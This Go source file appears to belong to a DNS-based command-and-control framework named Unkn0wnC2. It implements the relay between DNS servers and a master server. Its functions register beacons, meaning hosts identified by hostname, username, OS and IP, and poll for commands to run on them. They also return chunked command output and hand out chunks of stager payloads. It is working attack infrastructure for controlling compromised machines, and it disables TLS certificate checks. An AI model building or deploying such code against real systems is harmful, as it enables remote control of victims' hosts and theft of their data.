// Package main implements the Master Server client for DNS C2 servers.
// This enables DNS servers to operate in distributed mode by reporting beacons,
// polling for tasks, and submitting results to the central Master Server.
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

// MasterClient handles communication with the Master Server
type MasterClient struct {
	masterURL    string
	serverID     string
	apiKey       string
	httpClient   *http.Client
	debug        bool
	lastCheckin  time.Time
	checkinMutex sync.RWMutex
}

// NewMasterClient creates a new master server client
func NewMasterClient(masterURL, serverID, apiKey string, debug bool) *MasterClient {
	// Configure HTTP client with TLS
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true, // For self-signed certs - in production, provide CA cert
		},
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	return &MasterClient{
		masterURL: masterURL,
		serverID:  serverID,
		apiKey:    apiKey,
		httpClient: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
		debug: debug,
	}
}

// Request/Response structures

type CheckinRequest struct {
	DNSServerID string                 `json:"dns_server_id"`
	APIKey      string                 `json:"api_key"`
	Status      string                 `json:"status"`
	Stats       map[string]interface{} `json:"stats"`
}

type BeaconReportRequest struct {
	DNSServerID string     `json:"dns_server_id"`
	APIKey      string     `json:"api_key"`
	Beacon      BeaconData `json:"beacon"`
}

type BeaconData struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	IPAddress string    `json:"ip_address"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
}

type ResultSubmitRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	TaskID      string `json:"task_id"`
	BeaconID    string `json:"beacon_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"`
}

type TaskResponse struct {
	ID       string `json:"id"`
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
	Status   string `json:"status"`
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message"`
	Data    interface{} `json:"data"`
}

// doRequest performs an HTTP request to the Master Server with retry logic
func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]byte, error) {
	url := mc.masterURL + endpoint

	var reqBody io.Reader
	if body != nil {
		jsonData, err := json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal request: %w", err)
		}
		reqBody = bytes.NewBuffer(jsonData)
	}

	// Retry logic with exponential backoff
	maxRetries := 3
	var lastErr error

	for attempt := 1; attempt <= maxRetries; attempt++ {
		req, err := http.NewRequest(method, url, reqBody)
		if err != nil {
			return nil, fmt.Errorf("failed to create request: %w", err)
		}

		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Unkn0wnC2-DNSServer/0.3.0")

		// Execute request
		resp, err := mc.httpClient.Do(req)
		if err != nil {
			lastErr = err
			if attempt < maxRetries {
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Request failed (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, err, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, err)
		}
		defer resp.Body.Close()

		// Read response body
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("failed to read response: %w", err)
		}

		// Check status code
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if attempt < maxRetries && (resp.StatusCode == 500 || resp.StatusCode == 503) {
				// Retry on server errors
				lastErr = fmt.Errorf("server error: %d - %s", resp.StatusCode, string(respBody))
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Server error (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, lastErr, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(respBody))
		}

		return respBody, nil
	}

	return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, lastErr)
}

// Checkin sends a heartbeat to the Master Server
func (mc *MasterClient) Checkin(stats map[string]interface{}) error {
	req := CheckinRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Status:      "active",
		Stats:       stats,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/checkin", req)
	if err != nil {
		return fmt.Errorf("checkin failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("checkin rejected: %s", resp.Message)
	}

	mc.checkinMutex.Lock()
	mc.lastCheckin = time.Now()
	mc.checkinMutex.Unlock()

	if mc.debug {
		logf("[Master Client] Checkin successful")
	}

	return nil
}

// ReportBeacon reports a new or updated beacon to the Master Server
func (mc *MasterClient) ReportBeacon(beacon *Beacon) error {
	beaconData := BeaconData{
		ID:        beacon.ID,
		Hostname:  beacon.Hostname,
		Username:  beacon.Username,
		OS:        beacon.OS,
		Arch:      beacon.Arch,
		IPAddress: beacon.IPAddress,
		FirstSeen: beacon.FirstSeen,
		LastSeen:  beacon.LastSeen,
	}

	req := BeaconReportRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Beacon:      beaconData,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/beacon", req)
	if err != nil {
		return fmt.Errorf("beacon report failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse beacon response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("beacon report rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Beacon reported: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	return nil
}

// PollTasks fetches pending tasks from the Master Server for local beacons
func (mc *MasterClient) PollTasks() ([]TaskResponse, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/tasks?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("task poll failed: %w", err)
	}

	// Parse response as task array
	var tasks []TaskResponse
	if err := json.Unmarshal(respData, &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse tasks response: %w", err)
	}

	if mc.debug && len(tasks) > 0 {
		logf("[Master Client] Received %d task(s) from master", len(tasks))
	}

	return tasks, nil
}

// SubmitResult sends a task result (or result chunk) to the Master Server
func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalChunks int, data string) error {
	req := ResultSubmitRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
		BeaconID:    beaconID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/result", req)
	if err != nil {
		return fmt.Errorf("result submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse result response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("result submit rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Result submitted: Task %s, chunk %d/%d", taskID, chunkIndex, totalChunks)
	}

	return nil
}

// SyncBeacons fetches all active beacons from the Master Server
// This allows DNS servers to be aware of beacons registered on other servers
func (mc *MasterClient) SyncBeacons() ([]BeaconData, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/beacons?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("beacon sync failed: %w", err)
	}

	// Parse response as beacon array
	var beacons []BeaconData
	if err := json.Unmarshal(respData, &beacons); err != nil {
		return nil, fmt.Errorf("failed to parse beacons response: %w", err)
	}

	if mc.debug && len(beacons) > 0 {
		logf("[Master Client] Synced %d beacon(s) from master", len(beacons))
	}

	return beacons, nil
}

// SubmitProgress sends task progress update to the Master Server
func (mc *MasterClient) SubmitProgress(taskID, beaconID string, receivedChunks, totalChunks int, status string) error {
	req := map[string]interface{}{
		"dns_server_id":   mc.serverID,
		"api_key":         mc.apiKey,
		"task_id":         taskID,
		"beacon_id":       beaconID,
		"received_chunks": receivedChunks,
		"total_chunks":    totalChunks,
		"status":          status,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/progress", req)
	if err != nil {
		return fmt.Errorf("progress submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse progress response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("progress submit rejected: %s", resp.Message)
	}

	return nil
}

// StartPeriodicCheckin starts a background goroutine for periodic check-ins
func (mc *MasterClient) StartPeriodicCheckin(interval time.Duration, statsFn func() map[string]interface{}) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			stats := statsFn()
			if err := mc.Checkin(stats); err != nil {
				if mc.debug {
					logf("[Master Client] Checkin error: %v", err)
				}
			}
		}
	}()
}

// StartPeriodicTaskPoll starts a background goroutine for polling tasks
func (mc *MasterClient) StartPeriodicTaskPoll(interval time.Duration, taskHandler func([]TaskResponse)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			tasks, err := mc.PollTasks()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Task poll error: %v", err)
				}
				continue
			}

			if len(tasks) > 0 {
				taskHandler(tasks)
			}
		}
	}()
}

// StartPeriodicBeaconSync starts a background goroutine for syncing beacons from master
func (mc *MasterClient) StartPeriodicBeaconSync(interval time.Duration, beaconHandler func([]BeaconData)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			beacons, err := mc.SyncBeacons()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Beacon sync error: %v", err)
				}
				continue
			}

			if len(beacons) > 0 {
				beaconHandler(beacons)
			}
		}
	}()
}

// GetLastCheckin returns the timestamp of the last successful check-in
func (mc *MasterClient) GetLastCheckin() time.Time {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()
	return mc.lastCheckin
}

// IsConnected checks if the master client has successfully checked in recently
func (mc *MasterClient) IsConnected() bool {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()

	// Consider connected if checked in within last 5 minutes
	return time.Since(mc.lastCheckin) < 5*time.Minute
}

// Stager session support

// StagerSessionInfo contains information about a stager deployment session
type StagerSessionInfo struct {
	SessionID   string   `json:"session_id"`
	TotalChunks int      `json:"total_chunks"`
	DNSDomains  []string `json:"dns_domains"`
	ChunkSize   int      `json:"chunk_size"`
}

// StagerChunkResponse contains chunk data from Master
type StagerChunkResponse struct {
	ChunkIndex int    `json:"chunk_index"`
	ChunkData  string `json:"chunk_data"`
	Success    bool   `json:"success"`
	Message    string `json:"message,omitempty"`
}

// InitStagerSession forwards a stager initialization request to Master
func (mc *MasterClient) InitStagerSession(stagerIP, os, arch string) (*StagerSessionInfo, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"stager_ip":     stagerIP,
		"os":            os,
		"arch":          arch,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/init", req)
	if err != nil {
		return nil, fmt.Errorf("stager init failed: %w", err)
	}

	var sessionInfo StagerSessionInfo
	if err := json.Unmarshal(respData, &sessionInfo); err != nil {
		return nil, fmt.Errorf("failed to parse stager init response: %w", err)
	}

	return &sessionInfo, nil
}

// GetStagerChunk requests a specific chunk from Master for a stager session
func (mc *MasterClient) GetStagerChunk(sessionID string, chunkIndex int, stagerIP string) (*StagerChunkResponse, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"session_id":    sessionID,
		"chunk_index":   chunkIndex,
		"stager_ip":     stagerIP,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/chunk", req)
	if err != nil {
		return nil, fmt.Errorf("stager chunk request failed: %w", err)
	}

	var chunkResp StagerChunkResponse
	if err := json.Unmarshal(respData, &chunkResp); err != nil {
		return nil, fmt.Errorf("failed to parse stager chunk response: %w", err)
	}

	if !chunkResp.Success {
		return nil, fmt.Errorf("chunk not available: %s", chunkResp.Message)
	}

	return &chunkResp, nil
}
